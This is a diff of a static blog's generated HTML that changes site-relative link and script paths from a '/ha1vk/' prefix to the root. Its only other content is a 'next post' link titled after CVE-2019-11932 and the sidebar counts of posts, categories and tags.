+    <a href="/2020/09/12/gif2ascii-CVE-2019-11932/" rel="next" title="gif2ascii_CVE_2019_11932">
       gif2ascii_CVE_2019_11932 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -359,20 +359,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -445,30 +445,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
